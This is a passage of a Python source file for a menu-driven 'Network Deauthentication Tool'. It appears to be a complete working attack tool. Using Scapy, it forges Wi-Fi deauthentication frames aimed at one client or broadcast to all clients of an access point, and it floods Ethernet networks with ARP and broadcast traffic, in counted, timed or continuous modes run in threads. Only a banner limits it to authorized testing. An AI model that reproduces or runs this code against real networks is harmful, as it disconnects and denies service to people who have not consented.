                            while (time.time() - start_time) < duration and not stop_flag.is_set():
                                sendp(arp_packet, iface=interface, count=5, verbose=0)
                                packets_sent += 5
                                time.sleep(1)
                            
                            print(f"[Attack:{thread_id}] Duration complete. Packets sent: {packets_sent}")
                            
                        elif count > 0:
                            for i in range(0, count, 5):
                                if stop_flag.is_set():
                                    break
                                sendp(arp_packet, iface=interface, count=5, verbose=0)
                                packets_sent += 5
                                if i % 50 == 0:
                                    print(f"[Attack:{thread_id}] Sent {i+5}/{count} packets")
                                time.sleep(1)
                            
                            print(f"[Attack:{thread_id}] Count complete. Packets sent: {packets_sent}")
                            
                        else:
                            print(f"[Attack:{thread_id}] Continuous mode started")
                            while not stop_flag.is_set():
                                sendp(arp_packet, iface=interface, count=5, verbose=0)
                                packets_sent += 5
                                if packets_sent % 50 == 0:
                                    print(f"[Attack:{thread_id}] Sent {packets_sent} packets")
                                time.sleep(1)
                        
                        status_msg = f"Completed - {packets_sent} packets"
                        
                except Exception as e:
                    print(f"[Attack:{thread_id}] ARP setup error: {e}")
                    status_msg = f"Error: {e}"
            
            logger.log(f"Deauth_{interface_type.capitalize()}", 
                      interface_type.capitalize(), interface, bssid, "", 
                      client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts", 
                      str(packets_sent), status_msg)
            
        except Exception as e:
            print(f"[Attack:{thread_id}] Error: {e}")
            logger.log(f"Deauth_{interface_type.capitalize()}", 
                      interface_type.capitalize(), interface, bssid, "", 
                      client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts", 
                      str(packets_sent), f"Error: {e}")
    
    def stop_attack():
        stop_flag.set()
        print(f"[Attack:{thread_id}] Stopping attack...")
    
    thread = threading.Thread(target=deauth_thread, name=thread_id)
    thread.daemon = True
    thread.stop = stop_attack  # Add stop method to thread
    thread.id = thread_id
    
    thread.start()
    attack_threads.append(thread)
    
    print(f"[Attack] Started attack thread: {thread_id}")
    return thread

def deauth_all(interface: str, interface_type: str, bssid: str = "", 
               channel: str = "", count: int = 0, duration: int = 0,
               thread_id: str = None) -> threading.Thread:
    """Deauthenticate all clients"""
    if not thread_id:
        thread_id = f"deauth_all_{int(time.time())}"
    
    stop_flag = threading.Event()
    
    def broadcast_deauth_thread():
        nonlocal interface, interface_type, bssid, channel, thread_id
        
        packets_sent = 0
        start_time = time.time()
        
        if interface_type == "wlan" and bssid and channel:
            # Broadcast deauth
            packet = RadioTap() / \
                    Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
                    Dot11Deauth(reason=7)
            
            try:
                # Set channel
                subprocess.run(['iwconfig', interface, 'channel', channel], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print(f"[Attack:{thread_id}] Starting broadcast deauth on {bssid}")
                
                if duration > 0:
                    while (time.time() - start_time) < duration and not stop_flag.is_set():
                        sendp(packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        time.sleep(0.1)
                    
                    print(f"[Attack:{thread_id}] Duration complete. Packets sent: {packets_sent}")
                    
                elif count > 0:
                    for i in range(count):
                        if stop_flag.is_set():
                            break
                        sendp(packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        if i % 100 == 0:
                            print(f"[Attack:{thread_id}] Sent {i+1}/{count} packets")
                        time.sleep(0.1)
                    
                    print(f"[Attack:{thread_id}] Count complete. Packets sent: {packets_sent}")
                    
                else:
                    print(f"[Attack:{thread_id}] Continuous broadcast deauth started")
                    while not stop_flag.is_set():
                        sendp(packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        if packets_sent % 500 == 0:
                            print(f"[Attack:{thread_id}] Sent {packets_sent} packets")
                        time.sleep(0.1)
                
                logger.log("Deauth_All", "Wi-Fi", interface, bssid, "", "", 
                          channel, f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"[Attack:{thread_id}] Error: {e}")
                logger.log("Deauth_All", "Wi-Fi", interface, bssid, "", "", 
                          channel, f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), f"Error: {e}")
        
        elif interface_type == "eth":
            # Ethernet broadcast
            try:
                broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                 IP(dst="255.255.255.255") / \
                                 UDP(dport=9) / b'X' * 100
                
                print(f"[Attack:{thread_id}] Starting broadcast disruption")
                
                if duration > 0:
                    while (time.time() - start_time) < duration and not stop_flag.is_set():
                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(0.5)
                    
                    print(f"[Attack:{thread_id}] Duration complete. Packets sent: {packets_sent}")
                    
                elif count > 0:
                    for i in range(0, count, 10):
                        if stop_flag.is_set():
                            break
                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        if i % 100 == 0:
                            print(f"[Attack:{thread_id}] Sent {i+10}/{count} packets")
                        time.sleep(0.5)
                    
                    print(f"[Attack:{thread_id}] Count complete. Packets sent: {packets_sent}")
                    
                else:
                    print(f"[Attack:{thread_id}] Continuous broadcast disruption started")
                    while not stop_flag.is_set():
                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        if packets_sent % 200 == 0:
                            print(f"[Attack:{thread_id}] Sent {packets_sent} packets")
                        time.sleep(0.5)
                
                logger.log("Broadcast_Disruption", "Ethernet", interface, "", "", "", "",
                          f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"[Attack:{thread_id}] Error: {e}")
                logger.log("Broadcast_Disruption", "Ethernet", interface, "", "", "", "",
                          f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), f"Error: {e}")
    
    def stop_attack():
        stop_flag.set()
        print(f"[Attack:{thread_id}] Stopping attack...")
    
    thread = threading.Thread(target=broadcast_deauth_thread, name=thread_id)
    thread.daemon = True
    thread.stop = stop_attack
    thread.id = thread_id
    
    thread.start()
    attack_threads.append(thread)
    
    print(f"[Attack] Started broadcast attack thread: {thread_id}")
    return thread

def display_networks(networks: List[Dict], interface_type: str = "Wi-Fi"):
    """Display networks in a table"""
    if not networks:
        print(f"\n[Display] No {interface_type} networks found!")
        return
    
    print(f"\n[Display] {interface_type} Networks Found:")
    print("="*90)
    print(f"{'#':<3} {'BSSID':<20} {'Channel':<10} {'ESSID':<30} {'Interface':<15}")
    print("="*90)
    
    for i, network in enumerate(networks, 1):
        bssid = network.get('BSSID', network.get('MAC', 'N/A'))
        channel = network.get('Channel', network.get('IP', 'N/A'))
        essid = network.get('ESSID', network.get('Type', 'Device'))
        interface = network.get('Interface', 'Unknown')
        
        print(f"{i:<3} {bssid:<20} {channel:<10} {str(essid)[:30]:<30} {interface:<15}")
    print("="*90)

def display_clients(clients: List[Dict]):
    """Display clients in a table"""
    if not clients:
        print("\n[Display] No clients found!")
        return
    
    print("\n[Display] " + "="*70)
    print(f"{'#':<3} {'Client MAC':<20} {'IP':<15} {'Type':<10} {'Interface':<15}")
    print("="*70)
    
    for i, client in enumerate(clients, 1):
        mac = client.get('MAC', 'N/A')
        ip = client.get('IP', 'N/A')
        client_type = client.get('Type', 'Unknown')
        interface = client.get('Interface', 'Unknown')
        
        print(f"{i:<3} {mac:<20} {ip:<15} {client_type:<10} {interface:<15}")
    print("="*70)

def check_adapter_status():
    """Check network adapter status"""
    print("\n[Status] Network Adapter Status:")
    print("="*80)
    
    interfaces = get_available_interfaces()
    
    for iface_type, iface_list in interfaces.items():
        if not iface_list:
            continue
            
        print(f"\n{iface_type.upper()} Interfaces:")
        print("-" * 40)
        
        for iface in iface_list:
            print(f"\n  Interface: {iface}")
            
            try:
                # Get MAC address
                with open(f'/sys/class/net/{iface}/address', 'r') as f:
                    mac = f.read().strip()
                    print(f"  MAC Address: {mac}")
                
                # Get state
                with open(f'/sys/class/net/{iface}/operstate', 'r') as f:
                    state = f.read().strip()
                    print(f"  State: {state}")
                
                # Get IP
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    print(f"  IP Address: {ip}")
                
                # For Wi-Fi
                if iface_type == "wlan" or iface_type == "monitor":
                    result = subprocess.run(['iwconfig', iface], 
                                          capture_output=True, text=True)
                    
                    mode_match = re.search(r'Mode:(\S+)', result.stdout)
                    if mode_match:
                        print(f"  Mode: {mode_match.group(1)}")
                    
                    channel_match = re.search(r'Channel (\d+)', result.stdout)
                    if channel_match:
                        print(f"  Channel: {channel_match.group(1)}")
                    
                    essid_match = re.search(r'ESSID:"([^"]+)"', result.stdout)
                    if essid_match:
                        essid = essid_match.group(1)
                        print(f"  Connected to: {essid if essid else 'None'}")
                        
            except Exception as e:
                print(f"  Error: {e}")
    
    logger.log("Check_Adapters", "All", "Multiple", status="Completed")

def configure_wifi_interface():
    """Configure WiFi interface"""
    interfaces = get_available_interfaces()
    
    if not interfaces["wlan"] and not interfaces["monitor"]:
        print("[Config] No WiFi interfaces found!")
        return None
    
    print("\n[Config] Available WiFi interfaces:")
    all_wifi = interfaces["wlan"] + interfaces["monitor"]
    
    for i, iface in enumerate(all_wifi, 1):
        mode = "Monitor" if iface in interfaces["monitor"] else "Managed"
        print(f"{i}. {iface} ({mode})")
    
    try:
        choice = int(input(f"\n[Config] Select interface (1-{len(all_wifi)}): "))
        if 1 <= choice <= len(all_wifi):
            selected_iface = all_wifi[choice-1]
            
            # Check if already in monitor mode
            if check_monitor_mode(selected_iface):
                print(f"\n[Config] {selected_iface} is already in monitor mode")
                use_current = input("[Config] Use current mode? (y/n): ").lower()
                if use_current == 'y':
                    return selected_iface
            
            # Ask to set monitor mode
            print(f"\n[Config] Selected interface: {selected_iface}")
            set_monitor = input("[Config] Set to monitor mode? (y/n): ").lower()
            
            if set_monitor == 'y':
                monitor_iface, success = set_monitor_mode(selected_iface)
                if success:
                    print(f"\n[Config] Interface configured: {monitor_iface}")
                    return monitor_iface
                else:
                    print("\n[Config] Failed to set monitor mode!")
                    return None
            else:
                print("\n[Config] Interface not changed")
                return selected_iface
        else:
            print("[Config] Invalid selection!")
            return None
    except ValueError:
        print("[Config] Please enter a valid number!")
        return None

def configure_eth_interface():
    """Configure Ethernet interface"""
    interfaces = get_available_interfaces()
    
    if not interfaces["eth"]:
        print("[Config] No Ethernet interfaces found!")
        return None
    
    print("\n[Config] Available Ethernet interfaces:")
    for i, iface in enumerate(interfaces["eth"], 1):
        print(f"{i}. {iface}")
    
    try:
        choice = int(input(f"\n[Config] Select interface (1-{len(interfaces['eth'])}): "))
        if 1 <= choice <= len(interfaces["eth"]):
            selected_iface = interfaces["eth"][choice - 1]
            print(f"\n[Config] Ethernet interface configured: {selected_iface}")
            return selected_iface
        else:
            print("[Config] Invalid selection!")
            return None
    except ValueError:
        print("[Config] Please enter a valid number!")
        return None

def stop_all_attacks():
    """Stop all running attacks"""
    global running, attack_threads
    running = False
    
    print("\n[Stop] Stopping all attacks...")
    
    # Stop each attack thread
    for thread in attack_threads[:]:  # Copy list to avoid modification during iteration
        try:
            if thread.is_alive():
                # Use thread-specific stop method if available
                if hasattr(thread, 'stop'):
                    thread.stop()
                
                # Wait for thread to finish
                thread.join(timeout=3)
                
                if thread.is_alive():
                    print(f"[Stop] Warning: Thread {thread.name} did not stop cleanly")
        except Exception as e:
            print(f"[Stop] Error stopping thread: {e}")
    
    attack_threads.clear()
    running = True
    print("[Stop] All attacks stopped.")

def view_logs():
    """View log file"""
    if os.path.exists(log_file):
        print(f"\n[Log] Log file: {log_file}")
        print("="*120)
        
        try:
            with open(log_file, 'r') as f:
                reader = csv.reader(f)
                rows = list(reader)
                
                if rows:
                    headers = rows[0]
                    if len(headers) >= 11:  # Check if we have enough columns
                        print(f"{headers[0]:<20} {headers[1]:<15} {headers[2]:<10} {headers[3]:<12} "
                              f"{headers[4]:<18} {headers[5]:<20} {headers[8]:<10} {headers[10]:<30}")
                        print("-"*120)
                        
                        for row in rows[1:]:
                            if len(row) >= 11:
                                print(f"{row[0]:<20} {row[1]:<15} {row[2]:<10} {row[3]:<12} "
                                      f"{row[4]:<18} {row[5][:20]:<20} {row[8]:<10} {row[10][:30]:<30}")
                    else:
                        print("Log file has incorrect format")
            
            print("="*120)
            print(f"\n[Log] Total entries: {len(rows)-1}")
        except Exception as e:
            print(f"[Log] Error reading log file: {e}")
    else:
        print("[Log] Log file not found!")

def show_active_attacks():
    """Show active attacks"""
    print("\n[Status] Active Attacks:")
    print("="*60)
    if attack_threads:
        for i, thread in enumerate(attack_threads, 1):
            status = "Running" if thread.is_alive() else "Stopped"
            print(f"{i}. {thread.name}: {status}")
    else:
        print("No active attacks.")
    print("="*60)

def main():
    global selected_network, selected_client, scan_results, clients_list, running
    global selected_interfaces
    
    check_root()
    
    if not check_dependencies():
        print("\n[ERROR] Missing dependencies. Exiting.")
        sys.exit(1)
    
    print("\n" + "="*70)
    print("NETWORK DEAUTHENTICATION TOOL - IMPROVED VERSION")
    print("Wi-Fi + Ethernet Support")
    print("For educational and authorized testing only!")
    print("="*70)
    
    # Show available interfaces
    interfaces = get_available_interfaces()
    print("\n[Status] Detected Interfaces:")
    for iface_type, iface_list in interfaces.items():
        if iface_list:
            print(f"  {iface_type.upper()}: {', '.join(iface_list)}")
        else:
            print(f"  {iface_type.upper()}: None")
    
    print("\n[Info] This version includes:")
    print("  ✓ Better interface tracking and restoration")
    print("  ✓ Improved monitor mode detection")
    print("  ✓ Thread-specific attack control")
    print("  ✓ Enhanced error handling")
    print("  ✓ Automatic cleanup on exit")
    print("="*70)
    
    try:
        while True:
            print("\n" + "="*70)
            print("MAIN MENU")
            print("="*70)
            print("1. Scan for Wi-Fi networks")
            print("2. Scan for Ethernet devices")
            print("3. Select a Wi-Fi network")
            print("4. Deauthenticate a client")
            print("5. Deauthenticate all clients")
            print("6. Configure Interfaces")
            print("7. Check Adapter Status")
            print("8. View Logs")
            print("9. Stop All Attacks")
            print("10. Restore Wi-Fi Connection")
            print("11. Show Active Attacks")
            print("12. Exit")
            print("="*70)
            
            choice = input("\n[Menu] Select an option (1-12): ").strip()
            
            if choice == '1':
                # Scan Wi-Fi
                if not selected_interfaces["wlan"]:
                    print("\n[Error] Wi-Fi interface not configured!")
                    print("[Error] Please configure it in Option 6 first.")
                    continue
                
                print(f"\n[Scan] Using interface: {selected_interfaces['wlan']}")
                
                # Check monitor mode
                if not check_monitor_mode(selected_interfaces["wlan"]):
                    print("[Scan] Interface is not in monitor mode!")
                    set_monitor = input("[Scan] Set to monitor mode now? (y/n): ").lower()
                    if set_monitor == 'y':
                        new_iface, success = set_monitor_mode(selected_interfaces["wlan"])
                        if success:
                            selected_interfaces["wlan"] = new_iface
                            print(f"[Scan] Interface set to: {selected_interfaces['wlan']}")
                        else:
                            print("[Scan] Failed to set monitor mode!")
                            continue
                    else:
                        continue
                
                # Scan networks
                scan_results = enhanced_wifi_scan(selected_interfaces["wlan"])
                
                if scan_results:
                    display_networks(scan_results, "Wi-Fi")
                    logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
                              status=f"Found {len(scan_results)} networks")
                else:
                    print("\n[Scan] No networks found!")
                    logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
                              status="No networks found")
            
            elif choice == '2':
                # Scan Ethernet
                if not selected_interfaces["eth"]:
                    print("\n[Error] Ethernet interface not configured!")
                    print("[Error] Please configure it in Option 6 first.")
                    continue
                
                scan_results = scan_arp_network(selected_interfaces["eth"])
                
                if scan_results:
                    display_networks(scan_results, "Ethernet")
                    logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
                              status=f"Found {len(scan_results)} devices")
                else:
                    print("\n[Scan] No devices found!")
                    logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
                              status="No devices found")
            
            elif choice == '3':
                # Select Wi-Fi network
                if not selected_interfaces["wlan"]:
                    print("\n[Error] Wi-Fi interface not configured!")
                    print("[Error] Please configure it in Option 6 first.")
                    continue
                
                # Check if interface is in monitor mode
                if not check_monitor_mode(selected_interfaces["wlan"]):
                    print(f"\n[Error] {selected_interfaces['wlan']} is not in monitor mode!")
                    print("[Error] Client scanning requires monitor mode.")
                    set_monitor = input("[Scan] Set to monitor mode now? (y/n): ").lower()
                    if set_monitor == 'y':
                        new_iface, success = set_monitor_mode(selected_interfaces["wlan"])
                        if success:
                            selected_interfaces["wlan"] = new_iface
                            print(f"[Scan] Interface set to: {selected_interfaces['wlan']}")
                        else:
                            print("[Scan] Failed to set monitor mode!")
                            continue
                    else:
                        continue
                
                if not scan_results or not any('BSSID' in net for net in scan_results):
                    print("\n[Error] Please scan for Wi-Fi networks first (Option 1)!")
                    continue
                
                wifi_nets = [net for net in scan_results if 'BSSID' in net]
                if not wifi_nets:
                    print("\n[Error] No Wi-Fi networks in scan results!")
                    continue
                
                display_networks(wifi_nets, "Wi-Fi")
                
                try:
                    net_choice = int(input(f"\n[Select] Select network (1-{len(wifi_nets)}): "))
                    if 1 <= net_choice <= len(wifi_nets):
                        selected_network = wifi_nets[net_choice-1]
                        print(f"\n[Select] Selected Network:")
                        print(f"  BSSID: {selected_network['BSSID']}")
                        print(f"  Channel: {selected_network['Channel']}")
                        print(f"  ESSID: {selected_network['ESSID']}")
                        
                        # Scan for clients
                        clients_list = select_network(
                            selected_interfaces["wlan"],
                            selected_network['BSSID'],
                            selected_network['Channel']
                        )
                        
                        if clients_list:
                            display_clients(clients_list)
                            logger.log("Client_Scan", "Wi-Fi", selected_interfaces["wlan"],
                                     selected_network['BSSID'], selected_network['ESSID'],
                                     status=f"Found {len(clients_list)} clients")
                        else:
                            print("\n[Scan] No clients found!")
                            logger.log("Client_Scan", "Wi-Fi", selected_interfaces["wlan"],
                                     selected_network['BSSID'], selected_network['ESSID'],
                                     status="No clients found")
                    else:
                        print("[Error] Invalid selection!")
                except ValueError:
                    print("[Error] Please enter a valid number!")
            
            elif choice == '4':
                # Deauth client
                print("\n[Attack] Select attack type:")
                print("1. Wi-Fi deauthentication")
                print("2. Ethernet ARP disruption")
                
                attack_type = input("[Attack] Select (1-2): ").strip()
                
                if attack_type == '1':
                    if not selected_network:
                        print("\n[Error] Please select a Wi-Fi network first (Option 3)!")
                        continue
                    
                    if not clients_list:
                        print("\n[Error] No clients available!")
                        continue
                    
                    display_clients(clients_list)
                    
                    try:
                        client_choice = int(input(f"\n[Select] Select client (1-{len(clients_list)}): "))
                        if 1 <= client_choice <= len(clients_list):
                            selected_client = clients_list[client_choice-1]
                            
                            print(f"\n[Attack] Selected Client: {selected_client['MAC']}")
                            print(f"[Attack] Network: {selected_network['ESSID']}")
                            
                            print("\n[Attack] Attack Options:")
                            print("1. Send specific number of packets")
                            print("2. Send for duration (seconds)")
                            print("3. Continuous")
                            
                            option = input("[Attack] Select (1-3): ").strip()
                            
                            if option == '1':
                                count = int(input("[Attack] Number of packets: "))
                                print(f"\n[Attack] Starting deauth...")
                                deauth_client(selected_interfaces["wlan"], "wlan",
                                            selected_network['BSSID'], selected_client['MAC'],
                                            count=count)
                                
                            elif option == '2':
                                duration = int(input("[Attack] Duration (seconds): "))
                                print(f"\n[Attack] Starting deauth for {duration} seconds...")
                                deauth_client(selected_interfaces["wlan"], "wlan",
                                            selected_network['BSSID'], selected_client['MAC'],
                                            duration=duration)
                                
                            elif option == '3':
                                print(f"\n[Attack] Starting continuous deauth...")
                                deauth_client(selected_interfaces["wlan"], "wlan",
                                            selected_network['BSSID'], selected_client['MAC'])
                                
                            else:
                                print("[Error] Invalid option!")
                        else:
                            print("[Error] Invalid selection!")
                    except ValueError:
                        print("[Error] Please enter a valid number!")
                
                elif attack_type == '2':
                    if not selected_interfaces["eth"]:
                        print("\n[Error] Ethernet interface not configured!")
                        continue
                    
                    target_mac = input("\n[Attack] Enter target MAC address: ").strip()
                    if not target_mac:
                        print("[Error] No MAC address provided!")
                        continue
                    
                    print("\n[Attack] Attack Options:")
                    print("1. Send specific number of packets")
                    print("2. Send for duration (seconds)")
                    print("3. Continuous")
                    
                    option = input("[Attack] Select (1-3): ").strip()
                    
                    if option == '1':
                        count = int(input("[Attack] Number of packets: "))
                        print(f"\n[Attack] Starting ARP disruption...")
                        deauth_client(selected_interfaces["eth"], "eth", "", 
                                     target_mac, count=count)
                        
                    elif option == '2':
                        duration = int(input("[Attack] Duration (seconds): "))
                        print(f"\n[Attack] Starting ARP disruption for {duration} seconds...")
                        deauth_client(selected_interfaces["eth"], "eth", "", 
                                     target_mac, duration=duration)
                        
                    elif option == '3':
                        print(f"\n[Attack] Starting continuous ARP disruption...")
                        deauth_client(selected_interfaces["eth"], "eth", "", 
                                     target_mac)
                        
                    else:
                        print("[Error] Invalid option!")
                
                else:
                    print("[Error] Invalid selection!")
            
            elif choice == '5':
                # Deauth all
                print("\n[Attack] Select attack type:")
                print("1. Wi-Fi broadcast deauth")
                print("2. Ethernet broadcast disruption")
                
                attack_type = input("[Attack] Select (1-2): ").strip()
                
                if attack_type == '1':
                    if not selected_network:
                        print("\n[Error] Please select a Wi-Fi network first (Option 3)!")
                        continue
                    
                    print(f"\n[Attack] Network: {selected_network['ESSID']}")
                    print(f"[Attack] Channel: {selected_network['Channel']}")
                    
                    print("\n[Attack] Attack Options:")
                    print("1. Send specific number of packets")
                    print("2. Send for duration (seconds)")
                    print("3. Continuous")
                    
                    option = input("[Attack] Select (1-3): ").strip()
                    
                    if option == '1':
                        count = int(input("[Attack] Number of packets: "))
                        print(f"\n[Attack] Starting broadcast deauth...")
                        deauth_all(selected_interfaces["wlan"], "wlan",
                                  selected_network['BSSID'], selected_network['Channel'],
                                  count=count)
                        
                    elif option == '2':
                        duration = int(input("[Attack] Duration (seconds): "))
                        print(f"\n[Attack] Starting broadcast deauth for {duration} seconds...")
                        deauth_all(selected_interfaces["wlan"], "wlan",
                                  selected_network['BSSID'], selected_network['Channel'],
                                  duration=duration)
                        
                    elif option == '3':
                        print(f"\n[Attack] Starting continuous broadcast deauth...")
                        deauth_all(selected_interfaces["wlan"], "wlan",
                                  selected_network['BSSID'], selected_network['Channel'])
                        
                    else:
                        print("[Error] Invalid option!")
                
                elif attack_type == '2':
                    if not selected_interfaces["eth"]:
                        print("\n[Error] Ethernet interface not configured!")
                        continue
                    
                    print("\n[Attack] Attack Options:")
                    print("1. Send specific number of packets")
                    print("2. Send for duration (seconds)")
                    print("3. Continuous")
                    
                    option = input("[Attack] Select (1-3): ").strip()
                    
                    if option == '1':
                        count = int(input("[Attack] Number of packets: "))
                        print(f"\n[Attack] Starting broadcast disruption...")
                        deauth_all(selected_interfaces["eth"], "eth", count=count)
                        
                    elif option == '2':
                        duration = int(input("[Attack] Duration (seconds): "))
                        print(f"\n[Attack] Starting broadcast disruption for {duration} seconds...")
                        deauth_all(selected_interfaces["eth"], "eth", duration=duration)
                        
                    elif option == '3':
                        print(f"\n[Attack] Starting continuous broadcast disruption...")
                        deauth_all(selected_interfaces["eth"], "eth")
                        
                    else:
                        print("[Error] Invalid option!")
                
                else:
                    print("[Error] Invalid selection!")
            
            elif choice == '6':
                # Configure interfaces
                print("\n[Config] Configure Interfaces:")
                print("1. Configure Wi-Fi interface")
                print("2. Configure Ethernet interface")
                print("3. Configure both")
                
                config_choice = input("[Config] Select (1-3): ").strip()
                
                if config_choice == '1':
                    iface = configure_wifi_interface()
                    if iface:
                        selected_interfaces["wlan"] = iface
                        print(f"\n[Config] Wi-Fi interface set to: {iface}")
                
                elif config_choice == '2':
                    iface = configure_eth_interface()
                    if iface:
                        selected_interfaces["eth"] = iface
                        print(f"\n[Config] Ethernet interface set to: {iface}")
                
                elif config_choice == '3':
                    wifi_iface = configure_wifi_interface()
                    if wifi_iface:
                        selected_interfaces["wlan"] = wifi_iface
                    
                    eth_iface = configure_eth_interface()
                    if eth_iface:
                        selected_interfaces["eth"] = eth_iface
                    
                    print(f"\n[Config] Interfaces configured:")
                    print(f"  Wi-Fi: {selected_interfaces.get('wlan', 'Not set')}")
                    print(f"  Ethernet: {selected_interfaces.get('eth', 'Not set')}")
                
                else:
                    print("[Error] Invalid choice!")
            
            elif choice == '7':
                check_adapter_status()
            
            elif choice == '8':
                view_logs()
            
            elif choice == '9':
                stop_all_attacks()
            
            elif choice == '10':
                # Restore Wi-Fi
                if selected_interfaces["wlan"]:
                    success = restore_managed_mode(selected_interfaces["wlan"])
                    if success:
                        print("\n[Restore] Wi-Fi restored to managed mode.")
                        print("[Restore] You may need to reconnect to your network.")
                    else:
                        print("\n[Restore] Failed to restore Wi-Fi.")
                else:
                    print("\n[Error] No Wi-Fi interface configured!")
            
            elif choice == '11':
                show_active_attacks()
            
            elif choice == '12':
                # Exit
                print("\n[Exit] Cleaning up and exiting...")
                
                # Show active attacks
                if attack_threads:
                    print(f"[Exit] Stopping {len(attack_threads)} active attacks...")
                
                # Stop all attacks
                stop_all_attacks()
                
                # Restore interfaces
                restore_all_interfaces()
                
                print("\n[Exit] Thank you for using Network Deauthentication Tool!")
                print("[Exit] Remember: Use only for authorized testing!")
                print("[Exit] Exiting...")
                break
            
            else:
                print("\n[Error] Invalid option! Please select 1-12.")
                
    except KeyboardInterrupt:
        print("\n\n[Interrupt] Interrupted by user.")
        cleanup_handler()
        print("[Exit] Exiting...")
    except Exception as e:
        print(f"\n[Error] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        logger.log("System_Error", "System", "", status=f"Unexpected error: {e}")
        cleanup_handler()

if __name__ == "__main__":
    # Add command line argument parsing
    parser = argparse.ArgumentParser(description='Network Deauthentication Tool')
    parser.add_argument('--test', action='store_true', help='Test mode - check dependencies only')
    parser.add_argument('--cleanup', action='store_true', help='Cleanup interfaces and exit')
    parser.add_argument('--log', help='Specify log file location')
    
    args = parser.parse_args()
    
    if args.test:
        print("[Test] Testing mode activated")
        check_root()
        check_dependencies()
        sys.exit(0)
    
    if args.cleanup:
        print("[Cleanup] Manual cleanup requested")
        restore_all_interfaces()
        sys.exit(0)
    
    # Update log file if specified via command line
    if args.log:
        log_file = args.log
        logger = Logger(log_file)
    
    main()
